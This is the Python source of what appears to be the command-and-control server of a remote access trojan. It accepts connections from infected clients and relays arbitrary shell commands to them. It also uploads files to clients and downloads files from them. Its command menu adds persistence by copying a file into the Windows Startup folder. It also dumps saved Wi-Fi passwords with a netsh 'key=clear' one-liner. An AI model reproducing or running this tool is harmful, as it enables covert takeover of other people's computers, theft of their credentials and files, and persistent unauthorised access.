import socket
import threading
import time



Connections = []
port = 5400
ip = "0.0.0.0"
ADDR = (ip,port)
HEADER = 800
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "disconnect"
global target



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def send(target, msg):
	try:
		if msg.find("send")!=-1:
			client = target[0]
			message = msg.encode(FORMAT)
			msg_length = len(message)
			send_length = str(msg_length).encode(FORMAT)
			send_length += b' ' * (HEADER- len(send_length))
			client.send(send_length)
			client.send(message)
		else:
			client = target[0]
			message = msg.encode(FORMAT)
			msg_length = len(message)
			send_length = str(msg_length).encode(FORMAT)
			send_length += b' ' * (HEADER- len(send_length))
			client.send(send_length)
			client.send(message)
	except:
		print('ERROR SENDING THE MESSAGE')
	if message == DISCONNECT_MESSAGE:
		for i in range(len(Connections)-1):
			if Connections[i][0] == client:
				remthis = i
				break
		print("REMOVING")
		Connections.pop(remthis)

def handle_client(conn, addr, fid):
	global target
	print(f"   NEW CONNECTION {addr} connected.")
	connected = True
	try:
		while connected:
			msg_len = conn.recv(HEADER).decode(FORMAT)
			if msg_len:
				msg_len = int(msg_len)
				msg = conn.recv(msg_len).decode(FORMAT)
				print(f'{msg}')
				if msg == "START FILE TRANSFER":
					save_as = str(input("   WHERE WOULD YOU LIKE THE FILE TO SAVE: "))
					send(target, save_as)
					to_send = str(input("   PATH OF FILE: "))
					try:
						f = open(to_send,'rb')
						l = f.read(HEADER)
						while (l):
						    print('Sending...')
						    conn.send(l)
						    l = f.read(HEADER)
						f.close()
					except:
						print("ERROR TRANSFERING FILES")

				elif msg == "START RECIEVING":
					save_as = str(input("   WHERE TO SAVE: "))
					to_send = str(input("   WHICH FILE TO SAVE: "))
					send(target, to_send)
					try:
						f = open(save_as,'wb')
						l = conn.recv(HEADER)
						while (l):
							print("Receiving...")
							f.write(l)
							l = conn.recv(HEADER)
							if len(l) < HEADER:
								print("Receiving...")
								f.write(l)
								break
						f.close()
						print("   FILE SAVED!!!")
					except:
						print("   COULDNT RECIEVE FILE")
	except:
		print(f"   [-]{addr} DROPPED")
		for i in range(0, len(Connections)):
			if Connections[i][1] == addr:
				save = i
				break
		try:
			Connections.pop(save)
		except:
			print('Error removing it from connections')
		conn.close()


def get_conn(server):
	fid = 0
	global target
	while True:

		server.listen()
		conn, addr = server.accept()
		fid = fid + 1
		thread = threading.Thread(target=handle_client, args=(conn, addr,fid))
		thread.start()
		Connections.append((conn, addr, fid))

def main(server):
	dest = ''
	global target, output
	commands = ["   STARTUP ITEM", "   WIFI PASSWORDS"]
	getting_connections = threading.Thread(target=get_conn, args=(server,)).start()
	while True:
		choice = -1
		print("   [1] Display all connections \n   [2] Set connection\n   [3] Send Message\n   [4] Commands\n   [5] Remove Connection\n\n\n")
		try:
			choice = int(input("   CHOOSE AN OPTION: "))
		except:
			pass
		print('\n')
		if choice:
			if choice == 1:
				for i in Connections:
					print(i[1])
			elif choice == 2:
				num = int(input("   NUMBER OF THE CONNECT STARTING FROM 0:   "))
				try:
					target = Connections[num]
				except:
					print("   NO SUCH TARGET")
			elif choice == 3:
				while True:
					msg = str(input("   >>> "))
					if msg == 'exit':
						break
					try:
						if msg:
							send(target, msg)
					except:
						print("   ASSIGN A TARGET")
			elif choice == 4:
				while True:
					for i in range(len(commands)):
						print(f"   {commands[i]}\n\n")
					current_command = str(input("   ENTER COMMAND:   "))
					if current_command == "exit":
						break
					elif current_command == '1':
						print('\n')
						send(target, 'cd')
						letter = str(input("   DRIVE LETTER:  "))
						user = str(input("   CURRENT USER:  "))
						loc = rf'''{letter}:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'''
						this_file = str(input("   WHAT IS THE FILE PATH:  "))
						masg = rf'''copy "{this_file}" "{loc}"'''
						send(target, masg)

					elif current_command == '2':
						msg = '''for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'''
						send(target, msg)
			elif choice == 5:
				for i in Connections:
					print(i[1])
				num = int(input("   WHICH CONENCTION TO REMOVE: "))
				if num !=-1:
					try:
						Connections.pop(num)
					except:
						print("ERROR REMOVING THE CONNECTION")
			elif choice == "exit":
				break
	conn.close()

print("\n\n\n\nSTARTING..........")
main(server)